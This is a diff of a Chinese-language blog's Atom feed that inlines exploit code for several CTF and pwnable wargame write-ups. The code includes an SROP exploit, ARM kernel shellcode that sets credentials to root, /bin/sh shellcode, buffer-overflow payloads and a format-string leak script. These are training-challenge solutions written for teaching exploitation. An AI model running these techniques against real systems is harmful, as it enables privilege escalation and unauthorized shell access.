+&lt;noscript&gt;&lt;pre&gt;#!/usr/bin/env python
+# coding=utf8
+
+from pwn import p64, process, ELF
+from time import sleep
+
+EXECUTABLE = &amp;#39;/home/unexploitable/unexploitable&amp;#39;
+
+elf = ELF(EXECUTABLE)
+
+junk = 0xdeadbeef
+syscall_addr = 0x400560  # 0f 0a(syscall)
+pop_junk_rbx_rbp_r12_r13_r14_r15_ret = 0x4005e6
+mov_call = 0x4005d0
+pop_rbp_ret = 0x400512
+read_ret = 0x40055b
+bss_addr = elf.bss()
+rbp_base = bss_addr + 0x10
+sh_str_addr = rbp_base + 0x20 + 8 + 0x100
+
+# signal frame
+sig_frame = p64(syscall_addr) + p64(0)  # rt_sigreturn, junk
+sig_frame += p64(0) * 12  # junks
+sig_frame += p64(sh_str_addr) + p64(0)  # rdi, rsi
+sig_frame += p64(0) * 2  # junks
+sig_frame += p64(0) + p64(0x3b)  # rdx, rax
+sig_frame += p64(0) * 2  # junks
+sig_frame += p64(syscall_addr) + p64(0)  # rip, junk
+sig_frame += p64(0x33) + p64(0)  # cs, junk
+sig_frame += p64(0) * 6  # junks
+sig_frame += &amp;#39;/bin/sh\x00&amp;#39;
+
+# point rbp to .bss and read again
+payload1 = &amp;#39;A&amp;#39; * 0x10
+payload1 += p64(rbp_base)
+payload1 += p64(read_ret)
+
+# prepare signal frame
+payload2 = &amp;#39;A&amp;#39; * 0x10
+payload2 += p64(rbp_base+0x20) + p64(read_ret)
+payload2 += p64(junk) * 2
+payload2 += p64(junk) + sig_frame
+
+# set rax to 0xf using return value of read()
+payload3 = &amp;#39;B&amp;#39; * 0xf
+
+p = process(EXECUTABLE)
+sleep(3)
+p.send(payload1)
+sleep(0.1)
+p.send(payload2)
+sleep(0.1)
+p.send(payload3)
+p.interactive()&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/23b04edc7e79b1c71547&quot; data-gist-file=&quot;pwnable-hackerssecret-unexploitable-srop.py&quot;&gt;Loading gist...&lt;/div&gt;
 
 &lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
@@ -294,19 +804,19 @@
   &lt;/ol&gt;
 &lt;/div&gt;
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2015/12/writeup-pwnable-unexploitable/&quot;&gt;Writeup-Pwnable: unexploitable&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on December 23, 2015.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2015/12/writeup-pwnable-unexploitable/&quot;&gt;Writeup-Pwnable: unexploitable&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on December 23, 2015.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[Writeup-Pwnable: syscall]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2015/12/writeup-pwnable-syscall/" />
-  <id>/blog/2015/12/writeup-pwnable-syscall</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/" />
+  <id>https://cubarco.org/blog/2015/12/writeup-pwnable-syscall</id>
   <published>2015-12-16T00:00:00+08:00</published>
   <updated>2015-12-16T00:00:00+08:00</updated>
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">
@@ -370,16 +880,121 @@
 
 &lt;p&gt;我参考 @acama 的版本&lt;sup id=&quot;fnref:3&quot;&gt;&lt;a href=&quot;#fn:3&quot; class=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;写了一个( @acama 的版本&lt;code class=&quot;highlighter-rouge&quot;&gt;prepare_creds()&lt;/code&gt;之后直接就&lt;code class=&quot;highlighter-rouge&quot;&gt;commit_creds()&lt;/code&gt;, 这估计只在老版本可以).&lt;code class=&quot;highlighter-rouge&quot;&gt;prepare_creds()&lt;/code&gt;返回的结构体定义可以看参考&lt;sup id=&quot;fnref:4&quot;&gt;&lt;a href=&quot;#fn:4&quot; class=&quot;footnote&quot;&gt;4&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
 
+&lt;noscript&gt;&lt;pre&gt;@ prepare_creds and commit_creds
+.section .text
+.global _start
+_start:
+    push {lr}
+
+    mov r0, #0
+    ldr r3, =0x8003f44c  @ prepare_creds()
+    blx r3
+
+    push {r0}
+    sub r1, r1, r1
+    add r0, #4
+    str r1, [r0], #4  @ set uid, euid, gid, etc
+    str r1, [r0], #4
+    str r1, [r0], #4
+    str r1, [r0], #4
+    str r1, [r0], #4
+    str r1, [r0], #4
+    str r1, [r0], #4
+    str r1, [r0], #4
+
+    pop {r0}
+    ldr r3, =0x8003f56c  @ commit_creds(r0)
+    blx r3
+
+    pop {lr}
+    bx lr&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/f582d787f04eca93f8eb&quot; data-gist-file=&quot;cred.s&quot;&gt;Loading gist...&lt;/div&gt;
 
 &lt;p&gt;这个生成的指令是不能用原先的 223 号系统调用直接写进内存的，所以我准备了一个真正的&lt;code class=&quot;highlighter-rouge&quot;&gt;write-anything-anywhere&lt;/code&gt;的跳板:&lt;/p&gt;
 
+&lt;noscript&gt;&lt;pre&gt;@ Write anything anywhere
+
+.section .text
+.global _start
+_start:
+
+lp:
+    ldrb r3, [r0], #1
+    strb r3, [r1], #1
+    subs r2, r2, #1
+    bge lp
+
+    bx lr&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/f582d787f04eca93f8eb&quot; data-gist-file=&quot;waa.s&quot;&gt;Loading gist...&lt;/div&gt;
 
 &lt;p&gt;先把 waa 写进内存，然后把 cred 写进内存。至于写到哪里，我随手写了两个地址: 0x83f5cafe, 0x83f6beee.&lt;/p&gt;
 
 &lt;h3 id=&quot;expc&quot;&gt;exp.c&lt;/h3&gt;
 
+&lt;noscript&gt;&lt;pre&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+
+char cred[] = &amp;quot;\x04\xe0\x2d\xe5\x00\x00\xa0\xe3\x40\x30\x9f\xe5\x33\xff\x2f\xe1\x04\x00\x2d\xe5\x01\x10\x41\xe0\x04\x00\x80\xe2\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x00\x9d\xe4\x0c\x30\x9f\xe5\x33\xff\x2f\xe1\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x4c\xf4\x03\x80\x6c\xf5\x03\x80&amp;quot;;
+char waa[] = &amp;quot;\x01\x30\xd0\xe4\x01\x30\xc1\xe4\x01\x20\x52\xe2\xfb\xff\xff\xaa\x1e\xff\x2f\xe1&amp;quot;;
+
+char addr1[] = &amp;quot;\xfe\xca\xf5\x83&amp;quot;;
+char addr2[] = &amp;quot;\xee\xbe\xf6\x83&amp;quot;;
+
+int ret;
+
+int main()
+{
+    asm volatile (
+        &amp;quot;mov r0, %1\n&amp;quot;
+        &amp;quot;mov r1, %2\n&amp;quot;
+        &amp;quot;mov r7, #223\n&amp;quot;
+        &amp;quot;svc #0\n&amp;quot;
+        &amp;quot;mov r0, %3\n&amp;quot;
+        &amp;quot;mov r1, %4\n&amp;quot;
+        &amp;quot;mov r7, #223\n&amp;quot;
+        &amp;quot;svc #0\n&amp;quot;
+        &amp;quot;mov %0, r0&amp;quot;
+        : &amp;quot;=r&amp;quot; (ret)
+        : &amp;quot;r&amp;quot; (waa), &amp;quot;r&amp;quot; (0x83f5cafe),
+          &amp;quot;r&amp;quot; (addr1), &amp;quot;r&amp;quot; (0x8000e6c4)
+        : &amp;quot;r0&amp;quot;, &amp;quot;r1&amp;quot;, &amp;quot;r2&amp;quot;, &amp;quot;r3&amp;quot;, &amp;quot;lr&amp;quot;
+    );
+    printf(&amp;quot;return value: %x\n&amp;quot;, ret);
+
+    asm volatile (
+        &amp;quot;mov r0, %1\n&amp;quot;
+        &amp;quot;mov r1, %2\n&amp;quot;
+        &amp;quot;mov r2, %3\n&amp;quot;
+        &amp;quot;mov r7, #223\n&amp;quot;
+        &amp;quot;svc #0\n&amp;quot;
+        &amp;quot;mov r0, %4\n&amp;quot;
+        &amp;quot;mov r1, %5\n&amp;quot;
+        &amp;quot;mov r2, %6\n&amp;quot;
+        &amp;quot;mov r7, #223\n&amp;quot;
+        &amp;quot;svc #0\n&amp;quot;
+        &amp;quot;mov %0, r0&amp;quot;
+        : &amp;quot;=r&amp;quot; (ret)
+        : &amp;quot;r&amp;quot; (cred), &amp;quot;r&amp;quot; (0x83f6beee), &amp;quot;r&amp;quot; (89),
+          &amp;quot;r&amp;quot; (addr2), &amp;quot;r&amp;quot; (0x8000e6c4), &amp;quot;r&amp;quot; (5),
+          &amp;quot;r&amp;quot; (0)
+        : &amp;quot;r0&amp;quot;, &amp;quot;r1&amp;quot;, &amp;quot;r2&amp;quot;, &amp;quot;r3&amp;quot;, &amp;quot;r5&amp;quot;, &amp;quot;lr&amp;quot;
+    );
+    printf(&amp;quot;return value: %x\n&amp;quot;, ret);
+
+    asm volatile (
+        &amp;quot;mov r7, #223\n&amp;quot;
+        &amp;quot;svc #0\n&amp;quot;
+        &amp;quot;mov %0, r0&amp;quot;
+        : &amp;quot;=r&amp;quot; (ret)
+        :
+        : &amp;quot;r0&amp;quot;, &amp;quot;r1&amp;quot;, &amp;quot;r3&amp;quot;, &amp;quot;lr&amp;quot;
+    );
+
+    execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;sh&amp;quot;, NULL);
+    return 0;
+}&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/f582d787f04eca93f8eb&quot; data-gist-file=&quot;1-pwnable-rookiss-syscall.c&quot;&gt;Loading gist...&lt;/div&gt;
 
 &lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
@@ -401,19 +1016,19 @@
   &lt;/ol&gt;
 &lt;/div&gt;
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2015/12/writeup-pwnable-syscall/&quot;&gt;Writeup-Pwnable: syscall&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on December 16, 2015.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/&quot;&gt;Writeup-Pwnable: syscall&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on December 16, 2015.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[Writeup-Pwnable: tiny & tiny_easy]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy/" />
-  <id>/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy/" />
+  <id>https://cubarco.org/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy</id>
   <published>2015-12-11T00:00:00+08:00</published>
   <updated>2015-12-11T00:00:00+08:00</updated>
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;h2 id=&quot;tinyeasy&quot;&gt;tiny_easy&lt;/h2&gt;
@@ -453,6 +1068,36 @@ Breakpoint 1, 0x08048054 in ?? ()
 
 &lt;h6 id=&quot;exptinyeasyc&quot;&gt;exp.tiny_easy.c&lt;/h6&gt;
 
+&lt;noscript&gt;&lt;pre&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;sys/wait.h&amp;gt;
+
+char *shellcode = \
+     &amp;quot;\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0\xb0\x0b\xcd&amp;quot;
+     &amp;quot;\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69&amp;quot;
+     &amp;quot;\x6e\x2f\x73\x68&amp;quot;;
+
+int main()
+{
+    char arg[130001];
+    int status;
+    memset(arg, &amp;#39;\x90&amp;#39;, 130000);
+    strcpy(arg + 130000 - strlen(shellcode), shellcode);
+
+    for (;;) {
+        if (0 == fork())
+            execl(&amp;quot;/home/tiny_easy/tiny_easy&amp;quot;, &amp;quot;\xe0\xf0\x7c\xff&amp;quot;,
+                    arg, arg, arg, arg, arg, arg, arg, arg,
+                    arg, arg, arg, arg, arg, arg, arg, arg,
+                    NULL);
+        wait(&amp;amp;status);
+        if (WIFEXITED(status))
+            break;
+    }
+
+    return 0;
+}&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/03fb090852a3303f58db&quot; data-gist-file=&quot;pwnable-rookiss-tiny-easy.c&quot;&gt;Loading gist...&lt;/div&gt;
 
 &lt;h4 id=&quot;vdso2&quot;&gt;2. vDSO&lt;sup id=&quot;fnref:2&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/h4&gt;
@@ -463,6 +1108,22 @@ Breakpoint 1, 0x08048054 in ?? ()
 
 &lt;h6 id=&quot;exptinyeasypy&quot;&gt;exp.tiny_easy.py&lt;/h6&gt;
 
+&lt;noscript&gt;&lt;pre&gt;#!/usr/bin/env python
+# coding=utf8
+
+from pwn import p32, process
+
+pop_ret = 0x55557b62  # &amp;quot;pop ecx; ret&amp;quot; from vdso
+
+shellcode = (&amp;quot;\x31\xc0\x50\x68\x2f\x2f\x73&amp;quot;
+             &amp;quot;\x68\x68\x2f\x62\x69\x6e\x89&amp;quot;
+             &amp;quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&amp;quot;
+             &amp;quot;\xcd\x80\x31\xc0\x40\xcd\x80&amp;quot;)
+
+argv = [p32(pop_ret), shellcode]
+
+p = process(argv, executable=&amp;#39;/home/tiny_easy/tiny_easy&amp;#39;)
+p.interactive()&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/03fb090852a3303f58db&quot; data-gist-file=&quot;pwnable-rookiss-tiny-easy.py&quot;&gt;Loading gist...&lt;/div&gt;
 
 &lt;h2 id=&quot;tiny&quot;&gt;tiny&lt;/h2&gt;
@@ -495,6 +1156,33 @@ Breakpoint 1, 0x08048054 in ?? ()
 &lt;h6 id=&quot;exptinysh&quot;&gt;exp.tiny.sh&lt;/h6&gt;
 &lt;p&gt;这个 exp 的核心是 C (其实就是一句&lt;code class=&quot;highlighter-rouge&quot;&gt;execle()&lt;/code&gt;的事情), 用 shell 写只是为了方便，可以把&lt;code class=&quot;highlighter-rouge&quot;&gt;ulimit -s unlimited&lt;/code&gt;这些命令放在一起(调试过程中还用到了其他命令，最后删的只剩 ulimit…)，而且用一个脚本解题本身是一件很酷的事情XD.&lt;/p&gt;
 
+&lt;noscript&gt;&lt;pre&gt;#!/usr/bin/env bash
+
+tempfile=$(mktemp -d)
+echo $tempfile
+cd $tempfile
+
+gcc -xc - -oexp &amp;lt;&amp;lt;\EOF
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+
+int main()
+{
+    char *envp[] = {
+        &amp;quot;env1=1&amp;quot;, &amp;quot;env2=2&amp;quot;, &amp;quot;env3=3&amp;quot;,
+        &amp;quot;/bin/sh&amp;quot;, &amp;quot;env5=5&amp;quot;, NULL
+    };
+    execle(&amp;quot;/home/tiny/tiny&amp;quot;, &amp;quot;\xc8\x75\x55\x55&amp;quot;,
+           &amp;quot;A&amp;quot;, &amp;quot;A&amp;quot;, &amp;quot;A&amp;quot;, &amp;quot;A&amp;quot;, &amp;quot;A&amp;quot;, &amp;quot;A&amp;quot;,
+           &amp;quot;A&amp;quot;, &amp;quot;A&amp;quot;, &amp;quot;A&amp;quot;, &amp;quot;A&amp;quot;, NULL, envp);
+
+    return 0;
+}
+EOF
+
+ulimit -s unlimited
+
+exec ./exp&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/d379e31c9487c8ee07f2&quot; data-gist-file=&quot;pwnable-hackerssecret-tiny.sh&quot;&gt;Loading gist...&lt;/div&gt;
 
 &lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
@@ -516,20 +1204,20 @@ Breakpoint 1, 0x08048054 in ?? ()
   &lt;/ol&gt;
 &lt;/div&gt;
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy/&quot;&gt;Writeup-Pwnable: tiny & tiny_easy&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on December 11, 2015.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy/&quot;&gt;Writeup-Pwnable: tiny & tiny_easy&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on December 11, 2015.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[Writeup-Seccon CTF: FSB:TreeWalker]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2015/12/seccon-ctf-writeup-fsb-treewalker/" />
-  <id>/blog/2015/12/seccon-ctf-writeup-fsb-treewalker</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2015/12/seccon-ctf-writeup-fsb-treewalker/" />
+  <id>https://cubarco.org/blog/2015/12/seccon-ctf-writeup-fsb-treewalker</id>
   <updated>2015-12-13T00:00:00-00:00</updated>
   <published>2015-12-07T00:00:00+08:00</published>
   
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;h3 id=&quot;printf&quot;&gt;printf()&lt;/h3&gt;
@@ -655,6 +1343,55 @@ Breakpoint 1, 0x08048054 in ?? ()
 
 &lt;p&gt;我在比赛中用的 leak 一次只能 leak 一个字符，赛后重写改进了一下，能 leak 4 个字符，稍微加快一点。&lt;/p&gt;
 
+&lt;noscript&gt;&lt;pre&gt;#!/usr/bin/env python
+# coding=utf8
+
+from pwn import context, p64, process, remote
+from struct import unpack
+
+context.arch = &amp;#39;amd64&amp;#39;
+
+# p = process(&amp;#39;./treewalker&amp;#39;)
+p = remote(&amp;#39;treewalker.pwn.seccon.jp&amp;#39;, 20000)
+
+leak_stack = p.recvline().strip()
+tree_addr = int(leak_stack, 16)
+print &amp;#39;root: &amp;#39; + hex(tree_addr)
+
+
+def leak(addr):
+    p.send(p64(0x1000))
+    fsb = &amp;#39;%x%x&amp;#39;*15 + &amp;#39;A&amp;#39;*36 + &amp;#39;ident%s\n&amp;#39;*4 + \
+        p64(addr) + p64(addr + 1) + p64(addr + 2) + p64(addr + 3)
+    p.send(fsb + &amp;#39;\x00&amp;#39; * (0x1000 - len(fsb)))
+
+    ret = []
+    for i in range(4):
+        p.recvuntil(&amp;#39;ident&amp;#39;)
+        r = p.recvline().strip(&amp;#39;\n&amp;#39;)
+        ret.append(r[0] if r else &amp;#39;\x00&amp;#39;)
+    return &amp;#39;&amp;#39;.join(ret)
+
+flag = &amp;#39;&amp;#39;
+char = &amp;#39;&amp;#39;
+while True:
+    if not tree_addr:
+        break
+
+    leakoff8 = leak(tree_addr + 8)
+    if leakoff8 == &amp;#39;\x00&amp;#39;*4:
+        char += &amp;#39;0&amp;#39;
+        tree_addr = unpack(&amp;#39;&amp;lt;I&amp;#39;, leak(tree_addr + 16))[0]
+    else:
+        char += &amp;#39;1&amp;#39;
+        tree_addr = unpack(&amp;#39;&amp;lt;I&amp;#39;, leakoff8)[0]
+
+    if len(char) == 8:
+        flag += chr(int(char, 2))
+        print flag
+        char = &amp;#39;&amp;#39;
+
+p.send(p64(0))&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/a3ce8d93cb4860500090&quot;&gt;Loading gist...&lt;/div&gt;
 
 &lt;p&gt;一开始我准备用&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;%31$s&quot;&lt;/code&gt;直接 printf, 但是会报&lt;code class=&quot;highlighter-rouge&quot;&gt;*** invalid %N$ use detected ***&lt;/code&gt;. 这是由于 Glibc 的 FORTIFY_SOURCE, 可以绕过，具体方法看&lt;a href=&quot;http://phrack.org/issues/67/9.html&quot;&gt;这篇文章&lt;/a&gt;。&lt;/p&gt;
@@ -674,19 +1411,19 @@ Breakpoint 1, 0x08048054 in ?? ()
 &lt;/ol&gt;
 
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2015/12/seccon-ctf-writeup-fsb-treewalker/&quot;&gt;Writeup-Seccon CTF: FSB:TreeWalker&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on December 07, 2015.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2015/12/seccon-ctf-writeup-fsb-treewalker/&quot;&gt;Writeup-Seccon CTF: FSB:TreeWalker&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on December 07, 2015.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[Writeup-9447 CTF: calcpop-reloaded]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2015/12/9477-calcpop-reloaded-writeup/" />
-  <id>/blog/2015/12/9477-calcpop-reloaded-writeup</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2015/12/9477-calcpop-reloaded-writeup/" />
+  <id>https://cubarco.org/blog/2015/12/9477-calcpop-reloaded-writeup</id>
   <published>2015-12-04T00:00:00+08:00</published>
   <updated>2015-12-04T00:00:00+08:00</updated>
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;p&gt;&lt;em&gt;从这一题开始，9447 加上了 POW, 其实只要爆破就可以，这里就不放脚本了。（关于 POW, 有个叫 hashcash 的东西，挺有意思的）&lt;/em&gt;&lt;/p&gt;
@@ -752,21 +1489,70 @@ call ebx  ; spawn(%x, %x, %d)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;可以用 redos 中的 level1 本地调试。&lt;/p&gt;
 
+&lt;noscript&gt;&lt;pre&gt;#!/usr/bin/env python
+# coding=utf8
+
+from pwn import p32, remote, context, asm, shellcraft
+
+import sys
+
+context.arch = &amp;#39;i386&amp;#39;
+
+p = remote(&amp;#39;localhost&amp;#39;, 9447)
+
+p.recvuntil(&amp;#39;Welcome to calc.exe\n&amp;#39;)
+
+p.sendline(&amp;#39;get_buf_addr&amp;#39;)
+buf_addr = int(p.recvline().split()[-1], 16)
+ecx_set = buf_addr + 0x98 - 16 - 4 + 4
+shellcode_addr = buf_addr + 0x98 - 16 - 4 + 4*2 + 0x20
+
+shellcode_str = (
+    &amp;#39;&amp;#39;&amp;#39;
+    {}
+    mov edi, esp
+    {}
+    push edi
+    push edi
+    push 0xdeadbeef  /* junk */
+    mov ebx, {}
+    xor ebx, 0x12121212
+    call ebx
+    &amp;#39;&amp;#39;&amp;#39;.format(shellcraft.i386.pushstr(&amp;#39;/bin/sh&amp;#39;),
+               shellcraft.i386.push(1),
+               0x10011a ^ 0x12121212)  # spawn(%x, %x, %d)
+)
+print shellcode_str
+shellcode = asm(shellcode_str)
+
+payload = &amp;#39;A&amp;#39; * (0x98 - 16 - 4) + \
+    p32(shellcode_addr) + \
+    p32(ecx_set) + &amp;#39;A&amp;#39; * 0x20 + \
+    shellcode
+
+if &amp;#39;\n&amp;#39; in payload or &amp;#39;\x00&amp;#39; in payload:
+    print &amp;#39;newline or zero byte found in payload&amp;#39;
+    sys.exit(1)
+
+p.sendline(payload)
+p.sendline(&amp;quot;201527 0&amp;quot;)
+
+p.interactive()&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/b4aee1ac22f1b3039d30&quot;&gt;Loading gist...&lt;/div&gt;
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2015/12/9477-calcpop-reloaded-writeup/&quot;&gt;Writeup-9447 CTF: calcpop-reloaded&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on December 04, 2015.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2015/12/9477-calcpop-reloaded-writeup/&quot;&gt;Writeup-9447 CTF: calcpop-reloaded&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on December 04, 2015.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[Writeup-9447 CTF: calcpop]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2015/11/9477-calcpop-writeup/" />
-  <id>/blog/2015/11/9477-calcpop-writeup</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2015/11/9477-calcpop-writeup/" />
+  <id>https://cubarco.org/blog/2015/11/9477-calcpop-writeup</id>
   <published>2015-11-30T00:00:00+08:00</published>
   <updated>2015-11-30T00:00:00+08:00</updated>
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;p&gt;先看反汇编代码：&lt;/p&gt;
@@ -837,22 +1623,44 @@ Pattern 0x41326641 first occurrence at position 156 in pattern.&lt;/code&gt;&lt;
 
 &lt;p&gt;exp 如下:&lt;/p&gt;
 
+&lt;noscript&gt;&lt;pre&gt;#!/usr/bin/env python
+# coding=utf8
+
+from pwn import process, p32, remote
+
+p = process(&amp;quot;./calcpop&amp;quot;)
+#p = remote(&amp;#39;calcpop-4gh07blg.9447.plumbing&amp;#39;, 9447)
+
+print p.recvline()
+
+p.send(&amp;#39;get_stack_address\n&amp;#39;)
+line = p.recvline()
+stack_addr = int(line.split()[-1][2:], 16)
+
+shellcode = (&amp;quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69&amp;quot;
+             &amp;quot;\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&amp;quot;)
+
+payload = &amp;#39;A&amp;#39; * 156 + p32(stack_addr + 156 + 4) + shellcode + &amp;#39;\n&amp;#39;
+
+p.send(payload)
+p.send(&amp;#39;exit\n&amp;#39;)
+p.interactive()&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/ee054809d1643602b844&quot;&gt;Loading gist...&lt;/div&gt;
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2015/11/9477-calcpop-writeup/&quot;&gt;Writeup-9447 CTF: calcpop&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on November 30, 2015.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2015/11/9477-calcpop-writeup/&quot;&gt;Writeup-9447 CTF: calcpop&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on November 30, 2015.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[一个解决 Linux 版 Dota 2 中 CJK 字符显示成方块的 Workaround]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2015/05/dota2-blocky-cjk-fonts-workaround/" />
-  <id>/blog/2015/05/dota2-blocky-cjk-fonts-workaround</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2015/05/dota2-blocky-cjk-fonts-workaround/" />
+  <id>https://cubarco.org/blog/2015/05/dota2-blocky-cjk-fonts-workaround</id>
   <updated>2015-05-29T00:00:00-00:00</updated>
   <published>2015-05-14T00:00:00+08:00</published>
   
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;p&gt;不知道从什么时候开始，Linux 版本的 Dota 2 中载入界面的 tips sentences 和 player name 中的中文会显示成方框，详见 &lt;a href=&quot;https://github.com/ValveSoftware/Dota-2/issues/1688&quot;&gt;issue-1688&lt;/a&gt;。V社基本没搭理这个 bug，只好自己动手修。&lt;/p&gt;
@@ -921,20 +1729,20 @@ steam&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
   &lt;/ol&gt;
 &lt;/div&gt;
 
